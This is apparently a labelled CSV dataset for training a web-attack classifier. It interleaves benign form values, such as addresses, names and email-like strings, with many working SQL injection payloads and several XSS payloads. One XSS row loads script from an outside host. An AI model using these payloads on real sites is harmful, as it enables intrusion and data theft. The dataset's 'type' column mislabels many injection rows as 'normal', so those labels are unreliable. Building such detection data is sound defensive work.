Text,attack_type,Label,type
"1%""))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (((""%""=""",sqli,1,sql
"1) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",sqli,1,sql
"calle oroya 191,",norm,0,normal
laguna abusaid,norm,0,normal
hasan,norm,0,normal
47320,norm,0,normal
hoog,norm,0,normal
1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and 'pnpx'='pnpx,sqli,1,sql
07150,norm,0,normal
49719,norm,0,normal
salmern grenett,norm,0,normal
crioja,norm,0,normal
"1%') or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ('%'='",sqli,1,sql
3163610251088637,norm,0,normal
"1%')));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((('%'='",sqli,1,sql
"1%' or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
">""<table background=""javascript:document.cookie=true;"">",xss,2,xss
castellanos de zapardiel,norm,0,normal
0989859943250311,norm,0,normal
campo de san pedro,norm,0,normal
"1""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
1') and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)),sqli,1,sql
"1"")) and make_set(8403=8403,8899) and ((""nsyl""=""nsyl",sqli,1,normal
3675,norm,0,normal
"1"")) as vtad where 3653=3653 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
1542089007800249,norm,0,normal
zulaima,norm,0,normal
"-8178) union all select 4163,4163,4163,4163,4163,4163,4163--",sqli,1,sql
3270734525112576,norm,0,normal
colls messegu,norm,0,normal
imaz.leftwich@culturalsanpedrocf.no,norm,0,normal
"1%"")) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
kong-que,norm,0,normal
stankova@carrillo-de-albornoz.pt,norm,0,normal
"1') as keom where 7524=7524 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"calle kresaltxu 94, 3?b",norm,0,normal
martinho burgs,norm,0,normal
tinti@21horas.hr,norm,0,normal
-5534 or 1983=5721#,sqli,1,normal
"<body background=""javascript:alert('xss')"">",xss,2,xss
palazuelos de eresma,norm,0,normal
addetia,norm,0,normal
"1'))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('iaud'='iaud",sqli,1,sql
"-7543'))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
34347,norm,0,normal
77711232m,norm,0,normal
"1 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)# kfza",sqli,1,sql
"1%')) or 8421=(select count(*) from generate_series(1,5000000)) and (('%'='",sqli,1,sql
"1') where 5883=5883 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
desmoralizaci_n,norm,0,normal
castillo de bayuela,norm,0,normal
zinkie0,norm,0,normal
1863844446862720,norm,0,normal
2912546166098887,norm,0,normal
"1""))) and elt(4249=4249,7259) and (((""vhmc""=""vhmc",sqli,1,normal
4681606294541032,norm,0,normal
"1%"");select (case when (5163=4861) then 1 else 5163*(select 5163 from master..sysdatabases) end)--",sqli,1,sql
carminati@granbretana.com.uk,norm,0,normal
"1'))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
6608r.lo2uo,norm,0,normal
92246932g,norm,0,normal
villargordo del cabriel,norm,0,normal
01267,norm,0,normal
1' in boolean mode);select (case when (2717=2634) then 2717 else 2717*(select 2717 from mysql.db) end)#,sqli,1,sql
22618043g,norm,0,normal
-4058) union all select 9184--,sqli,1,sql
6g369zar41,norm,0,normal
"1"")) as eqeb where 6784=6784 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",sqli,1,sql
06670,norm,0,normal
"1"")) as jsdc where 2748=2748;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,sql
"1"" union all select null,null,null,null,null#",sqli,1,sql
1 rlike (select (case when (7689=7689) then 1 else 0x28 end)),sqli,1,sql
"1) as boed where 6787=6787;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
"1%');select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ('%'='",sqli,1,sql
6341819669963492,norm,0,normal
"1') and elt(1210=1210,sleep(5))",sqli,1,normal
"1%"") and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (""%""=""",sqli,1,normal
pandrang,norm,0,normal
tosca,norm,0,normal
1%'));select (case when (4006=1276) then 1 else 4006*(select 4006 from master..sysdatabases) end)--,sqli,1,sql
8893,norm,0,normal
poeta rafael arozarena 26 6?g,norm,0,normal
stanczak-kasem@movil-google.tj,norm,0,normal
vicario saetero,norm,0,normal
"1' where 4460=4460;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
saibun,norm,0,normal
23il04,norm,0,normal
-1<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></object>,xss,2,xss
"calle joan salvat papasseit s/n,",norm,0,normal
"1"")) as femc where 1313=1313 and 4595=4595#",sqli,1,normal
"1))) and elt(1210=1210,sleep(5)) and (((2341=2341",sqli,1,normal
enanzar,norm,0,normal
78285910m,norm,0,normal
1026055264847672,norm,0,normal
46317,norm,0,normal
"1%"" waitfor delay '0:0:5' and ""%""=""",sqli,1,normal
per8ebimie0to,norm,0,normal
idt,norm,0,normal
"1%"") or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (""%""=""",sqli,1,sql
"1')) as pqbq where 1865=1865;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
adradas,norm,0,normal
<script id=xss src=http://ha.ckers.org/xss.js?<b>,xss,2,normal
consumativo,norm,0,normal
"1%' and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and '%'='",sqli,1,sql
"1"")) as qvyu where 5962=5962 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",sqli,1,sql
madridejos,norm,0,normal
infalibilidad,norm,0,normal
requilorio,norm,0,normal
3947,norm,0,normal
"-7531') union all select 3072,3072,3072,3072,3072,3072,3072--",sqli,1,sql
"1%' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and '%'='",sqli,1,normal
d6mnificar,norm,0,normal
baziga-turtuno@ofertasrusas.dz,norm,0,normal
"1%')));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
pampa,norm,0,normal
pursima,norm,0,normal
31219,norm,0,normal
snips,norm,0,normal
uriah,norm,0,normal
"-2321%"") or 2271=7683--",sqli,1,sql
tsangas4@16horas.il,norm,0,normal
24717,norm,0,normal
"c/ gregal 56, 12?g",norm,0,normal
1'||(select 'xlmt' where 1664=1664;select (case when (1272=5883) then 1272 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
"1)));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
57471201c,norm,0,normal
7965,norm,0,normal
torres de la alameda,norm,0,normal
lemieux4,norm,0,normal
acre,norm,0,normal
gloria,norm,0,normal
"-3071)) as uiiu where 8910=8910 union all select 8910,8910,8910,8910,8910,8910,8910#",sqli,1,sql
80914738w,norm,0,normal
"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""></head>+adw-script+ad4-alert('xss');+adw-/script+ad4-",xss,2,sql
campe6n,norm,0,normal
esser,norm,0,normal
1%') and 4061=2730#,sqli,1,normal
fortner,norm,0,normal
frison@barnizultravioleta.jm,norm,0,normal
taber2era,norm,0,normal
"1%' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and '%'='",sqli,1,sql
60,norm,0,normal
"-5972"" or 8509=3448#",sqli,1,normal
caravantes,norm,0,normal
1' in boolean mode);select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
-7199'||(select 'ssty' where 5406=5406 order by 1#,sqli,1,sql
andreu agraso,norm,0,normal
fuentelviejo,norm,0,normal
-1621' in boolean mode) order by 1--,sqli,1,sql
1%')) order by 1--,sqli,1,sql
"1%""))) union all select null--",sqli,1,sql
monetaria,norm,0,normal
"1"")) as jucs where 6836=6836;select (case when (3414=8741) then 3414 else 3414*(select 3414 from information_schema.character_sets) end)#",sqli,1,sql
32252,norm,0,normal
"1"") as awdg where 9512=9512;select (case when (7169=7785) then 1 else 7169*(select 7169 from master..sysdatabases) end)--",sqli,1,sql
"1'+(select 'gjaq' where 5449=5449 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null))+'",sqli,1,sql
pablo iglesias s/n 2?f,norm,0,normal
bashan@lettere.pr,norm,0,normal
dehaven_carollo@muycurioso.lk,norm,0,normal
sufragio,norm,0,normal
brunella,norm,0,normal
"1) or 8466=benchmark(5000000,md5(0x694a4745))",sqli,1,normal
35715294c,norm,0,normal
4829100959791841,norm,0,normal
gorse@16horas.yu,norm,0,normal
kendell,norm,0,normal
1%'));(select * from (select(sleep(5)))srmq) and (('%'=',sqli,1,sql
34259,norm,0,normal
globula*riceo,norm,0,normal
tranz1do,norm,0,normal
"1) as rtpl where 1262=1262 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"1%"") or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (""%""=""",sqli,1,sql
46470,norm,0,normal
16650765f,norm,0,normal
"-4477')) union all select 8444,8444,8444,8444,8444,8444,8444,8444--",sqli,1,sql
1750,norm,0,normal
ipe$cacuana,norm,0,normal
keseris,norm,0,normal
59779905f,norm,0,normal
zein,norm,0,normal
pallicer plaza,norm,0,normal
"-1908"") where 6420=6420 union all select 6420,6420,6420,6420--",sqli,1,sql
dugas,norm,0,normal
7062474051769610,norm,0,normal
macoosh3,norm,0,normal
bittman,norm,0,normal
"-7083 union all select 7705,7705,7705,7705,7705#",sqli,1,sql
"calle ducado de neopatria 63, 12-h",norm,0,normal
spencer,norm,0,normal
ge2613an0,norm,0,normal
86464472c,norm,0,normal
waghorne,norm,0,normal
"1""));select * from generate_series(6200,6200,case when (6200=5449) then 1 else 0 end) limit 1--",sqli,1,sql
pintada,norm,0,normal
larreynaga arce,norm,0,normal
"c/ forjadores, 131",norm,0,normal
garrafe de toro,norm,0,normal
4296,norm,0,normal
"1"")) as mvxa where 3024=3024;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",sqli,1,sql
"1') where 1363=1363 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",sqli,1,sql
"-6754') where 8388=8388 union all select 8388,8388,8388,8388,8388--",sqli,1,sql
"prat de llobregat, el",norm,0,normal
quintn,norm,0,normal
hoyer,norm,0,normal
broun_granlund@purplemoongrn.fi,norm,0,normal
47162,norm,0,normal
83835081n,norm,0,normal
1) rlike (select (case when (8488=1270) then 1 else 0x28 end)),sqli,1,sql
1%' rlike (select * from (select(sleep(5)))sgvo) and '%'=',sqli,1,sql
18517,norm,0,normal
9067788407413640,norm,0,normal
stadlen@asociaciondearquitectoslatinoamericanos.tc,norm,0,normal
phaidra,norm,0,normal
ddima,norm,0,normal
3906482283290567,norm,0,normal
"1')) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('ykoz'='ykoz",sqli,1,sql
20847295a,norm,0,normal
f536e6a,norm,0,normal
pent0et3o,norm,0,normal
saliva+jo,norm,0,normal
"bosquecillo, 137",norm,0,normal
1' and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),sqli,1,sql
"1') and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('rvwk'='rvwk",sqli,1,sql
"1%"";(select * from (select(sleep(5)))acdk)#",sqli,1,sql
mairena,norm,0,normal
"la fragua 158, 11-e",norm,0,normal
7201,norm,0,normal
santa cruz del comercio,norm,0,normal
"1'||(select 'ryyc' from dual where 5196=5196 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'",sqli,1,sql
quisto,norm,0,normal
tamboreo,norm,0,normal
fasc!es,norm,0,normal
04897,norm,0,normal
"1"");select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (""snwx"" like ""snwx",sqli,1,sql
bassagaa gifra,norm,0,normal
karrantza harana/valle de carranza,norm,0,normal
"1"") where 6072=6072 and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
1es6si47e7t1,norm,0,normal
1));(select * from (select(sleep(5)))srmq) and ((4982=4982,sqli,1,sql
"1"" and (3020=3020)*6703 and ""itpt""=""itpt",sqli,1,normal
1%') and (3020=3020)*6703 and ('%'=',sqli,1,normal
7871313951029242,norm,0,normal
"-8025"") or (1436=4186)*4186 and (""sqwv"" like ""sqwv",sqli,1,normal
peng1in,norm,0,normal
2145088995876898,norm,0,normal
"1"")) and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
c0l0o4a,norm,0,normal
raha,norm,0,normal
"1"" or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
cavill,norm,0,normal
"1')) as atpy where 9020=9020 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
burbidge@elalamorestaurante.pr,norm,0,normal
kaidanovsky@soybueno.lt,norm,0,normal
"1""""(.'.(,(.",sqli,1,normal
deglutir,norm,0,normal
"1'+(select dagm where 5461=5461 or 8466=benchmark(5000000,md5(0x694a4745)))+'",sqli,1,sql
"-4135'))) union all select 4413,4413,4413#",sqli,1,sql
1');begin dbms_lock.sleep(5); end--,sqli,1,sql
trinidad,norm,0,normal
1'||(select 'ifts' from dual where 6329=6329;begin dbms_lock.sleep(5); end--,sqli,1,sql
1')));select sleep(5) and ((('klma'='klma,sqli,1,sql
1'||(select 'bifa' where 6077=6077 and 4547=9301,sqli,1,sql
"1'+(select 'suzs' where 2905=2905 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))+'",sqli,1,sql
denia,norm,0,normal
torrelles de foix,norm,0,normal
38690,norm,0,normal
rueda canuda,norm,0,normal
"1%""))) and 7758=4792 and (((""%""=""",sqli,1,normal
"1%"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (((""%""=""",sqli,1,sql
38993479s,norm,0,normal
5077412783362811,norm,0,normal
"1) where 9149=9149 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",sqli,1,sql
"-9392)) or elt(1032=1032,3623) and ((2975=2975",sqli,1,normal
"1')) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('acly' like 'acly",sqli,1,normal
meier,norm,0,normal
24836,norm,0,normal
1)) as wrhe where 6120=6120 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,sqli,1,sql
beomsahn,norm,0,normal
bizantina,norm,0,normal
almussafes,norm,0,normal
-7054) as gzvf where 9146=9146 or 3038=3038,sqli,1,normal
"1') as ccee where 8880=8880 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"1%"" and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
21208,norm,0,normal
"1' in boolean mode) union all select null,null,null,null,null,null,null--",sqli,1,sql
"-3872%""))) union all select 1637,1637,1637,1637,1637#",sqli,1,sql
1' and (3435=7210)*7210 and 'lxxt'='lxxt,sqli,1,normal
"1' in boolean mode) union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
"1%"" and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
67405434r,norm,0,normal
brinton2@tartasconamor.lr,norm,0,normal
"-3828%""))) or make_set(1765=8657,8657) and (((""%""=""",sqli,1,normal
48552,norm,0,normal
"1') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ('gfxr'='gfxr",sqli,1,sql
1)));begin user_lock.sleep(5); end and (((3673=3673,sqli,1,sql
1);begin dbms_lock.sleep(5); end--,sqli,1,sql
-3688'||(select 'pber' from dual where 7137=7137 order by 1#,sqli,1,sql
"-9136%"") union all select 3081,3081,3081,3081,3081,3081,3081#",sqli,1,sql
39426,norm,0,normal
"-1<iframe src=""javascript:document.cookie=true;>",xss,2,xss
justiniano,norm,0,normal
mallorie,norm,0,normal
vadim,norm,0,normal
4748,norm,0,normal
"1')) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (('lgcw'='lgcw",sqli,1,sql
bisunta,norm,0,normal
5155,norm,0,normal
1;waitfor delay '0:0:5'--,sqli,1,sql
"1'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('nbsf' like 'nbsf",sqli,1,sql
suponer,norm,0,normal
-4637' or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),sqli,1,sql
f9g10062,norm,0,normal
6287,norm,0,normal
"1) where 8856=8856 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"1);call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
7e2hered0962n,norm,0,normal
ricard,norm,0,normal
el cartero 44 5-b,norm,0,normal
-4289' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'agnc' like 'agnc,sqli,1,sql
"1""))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""wvyb""=""wvyb",sqli,1,normal
34575761e,norm,0,normal
15107,norm,0,normal
2427,norm,0,normal
enturbiar,norm,0,normal
1 and sleep(5),sqli,1,normal
-9581) as jkqo where 5200=5200 or 6872=6872--,sqli,1,sql
a0r4g7,norm,0,normal
hinwood-laretei@addl.es,norm,0,normal
moldero,norm,0,normal
28900,norm,0,normal
"c/ fernando vi 79, 1g",norm,0,normal
"1"") as lkzz where 3565=3565 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",sqli,1,sql
1' in boolean mode) and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
adelaide,norm,0,normal
"calle vadell, 177",norm,0,normal
"1"") as ikdo where 4128=4128;begin user_lock.sleep(5); end--",sqli,1,sql
cabro,norm,0,normal
calle liebre 195,norm,0,normal
"1'||(select 'blvu' from dual where 9813=9813;select count(*) from generate_series(1,5000000))||'",sqli,1,sql
"1' or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
sabadell,norm,0,normal
6742076773015534,norm,0,normal
"1"") as jask where 7629=7629 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",sqli,1,sql
43439,norm,0,normal
-1385'))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((('mjjd'='mjjd,sqli,1,sql
azorin 35 1b,norm,0,normal
-6755) or 9323=9323#,sqli,1,normal
"-1004"" where 6266=6266 order by 1#",sqli,1,normal
5793462659286586,norm,0,normal
porteril,norm,0,normal
"1');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ('fwok' like 'fwok",sqli,1,sql
mazza esplugas,norm,0,normal
<script>document.cookie=true;</script>,xss,2,xss
lafferty,norm,0,normal
61089913g,norm,0,normal
"c/ pozo seco 37, 6-d",norm,0,normal
8054,norm,0,normal
nazarena,norm,0,normal
patay,norm,0,normal
tilbrook@saludyfitness.pr,norm,0,normal
24410,norm,0,normal
plaa del pi verd 84 10b,norm,0,normal
16812,norm,0,normal
car7gordo,norm,0,normal
"1'||(select 'eyiy' from dual where 8127=8127;select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
2869539552329733,norm,0,normal
8866,norm,0,normal
"c/ el jacinto, 132,",norm,0,normal
"1%')) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (('%'='",sqli,1,sql
"calle manuel maria de arjona 80,",norm,0,normal
1541444021319279,norm,0,normal
zilzer@foreignoffice.fo,norm,0,normal
1') as njfg where 6392=6392 waitfor delay '0:0:5'--,sqli,1,sql
"<table id=xss><td background=""javascript:alert('xss')"">",xss,2,xss
gronwall,norm,0,normal
297,norm,0,normal
adlard@muebemiweb.ke,norm,0,normal
15821726a,norm,0,normal
tosigoso,norm,0,normal
"-7683"") where 9664=9664 union all select 9664,9664,9664,9664,9664,9664,9664#",sqli,1,sql
"1)) as wajy where 8593=8593;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
casabermeja,norm,0,normal
"1"") and elt(6651=1172,1172) and (""zfkb"" like ""zfkb",sqli,1,normal
tanquia jepus,norm,0,normal
"1"") and 3824=benchmark(5000000,md5(0x76555642)) and (""jozh""=""jozh",sqli,1,normal
10335,norm,0,normal
anoux_corsia@906.com.cz,norm,0,normal
58031849c,norm,0,normal
janenna,norm,0,normal
"1'))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((('lyem' like 'lyem",sqli,1,sql
19807221n,norm,0,normal
garca fong,norm,0,normal
haslund@arvigar.sl,norm,0,normal
"1"";select benchmark(5000000,md5(0x4c4d6142)) and ""vzft""=""vzft",sqli,1,sql
1 where 9393=9393 waitfor delay '0:0:5'--,sqli,1,sql
sisebuto,norm,0,normal
03291016s,norm,0,normal
boa4@sitienesunawebtienesunnegocio.es,norm,0,normal
hoste ustrell,norm,0,normal
doukoure7@14horas.py,norm,0,normal
"carretera estacion, 144, 8-d",norm,0,normal
jaran6ro,norm,0,normal
"1"") or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (""gcnq"" like ""gcnq",sqli,1,sql
"1%""));select sleep(5) and ((""%""=""",sqli,1,sql
"-4945 or make_set(9354=9354,7185)",sqli,1,normal
"1"") where 4878=4878 and (select * from (select(sleep(5)))fzno)--",sqli,1,sql
"1) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
frerichs@underdog.as,norm,0,normal
"1"") as htyo where 8322=8322 and 4595=4595#",sqli,1,normal
24391,norm,0,normal
tarragona,norm,0,normal
98011650w,norm,0,normal
"-6412)) as cnfs where 6557=6557 union all select 6557,6557,6557,6557,6557,6557,6557,6557,6557#",sqli,1,sql
"1"") where 5850=5850 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",sqli,1,sql
mieres,norm,0,normal
"1"" where 4294=4294 and make_set(2543=7988,7988)--",sqli,1,sql
gianina,norm,0,normal
0891410815966655,norm,0,normal
-1<? echo('<scr)';echo('ipt>document.cookie=true</script>'); ?>,xss,2,xss
01237478d,norm,0,normal
"1')) as xuab where 4369=4369 union all select null,null,null--",sqli,1,sql
"c/ montaer ruiz, 24, 12a",norm,0,normal
di rado elejalde,norm,0,normal
rabasse@showenvivo.com.yu,norm,0,normal
hayashi@librodeapuntes.tc,norm,0,normal
"torre-pacheco 35,",norm,0,normal
elysee,norm,0,normal
1' and 5835=6157 and 'bjee' like 'bjee,sqli,1,normal
3468950887704772,norm,0,normal
schouwen,norm,0,normal
pedralba de la pradera,norm,0,normal
"-1150') as hdby where 4032=4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",sqli,1,sql
74835105m,norm,0,normal
07u8e37ia,norm,0,normal
pianka@noviasteresapalacios.mc,norm,0,normal
compte,norm,0,normal
1827,norm,0,normal
1' and (3020=3020)*6703 and 'tmng' like 'tmng,sqli,1,normal
"c/ fuente 28,",norm,0,normal
liesemer,norm,0,normal
50780,norm,0,normal
5568407559303725,norm,0,normal
1))) rlike (select (case when (4367=6879) then 1 else 0x28 end)) and (((2542=2542,sqli,1,sql
ucedo ballar,norm,0,normal
benejam anglaril,norm,0,normal
1') as rhvm where 1420=1420;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
5558396757589314,norm,0,normal
gall20o,norm,0,normal
artenio,norm,0,normal
2473968960827836,norm,0,normal
malia,norm,0,normal
03390,norm,0,normal
"1%' or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and '%'='",sqli,1,normal
collinson_butarinski@fernandosoto.il,norm,0,normal
1%')));select sleep(5)#,sqli,1,sql
99020664y,norm,0,normal
chapman,norm,0,normal
"1 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)",sqli,1,normal
nanook@cup-id.lu,norm,0,normal
"1"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""rbqs""=""rbqs",sqli,1,sql
"1"") as doai where 7024=7024 union all select null,null,null,null,null,null,null,null--",sqli,1,sql
"-4679 where 9634=9634 union all select 9634,9634,9634,9634,9634,9634,9634--",sqli,1,sql
"1'))) and 8407=(select count(*) from generate_series(1,5000000)) and ((('pufu' like 'pufu",sqli,1,sql
zoq3et1r8,norm,0,normal
jarad,norm,0,normal
18210,norm,0,normal
garantir,norm,0,normal
8954375699794509,norm,0,normal
"1"") as ypfa where 6128=6128;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
"-4222') union all select 9267,9267,9267,9267,9267,9267--",sqli,1,sql
bunn,norm,0,normal
1'||(select 'zccb' from dual where 8911=8911;waitfor delay '0:0:5'--,sqli,1,sql
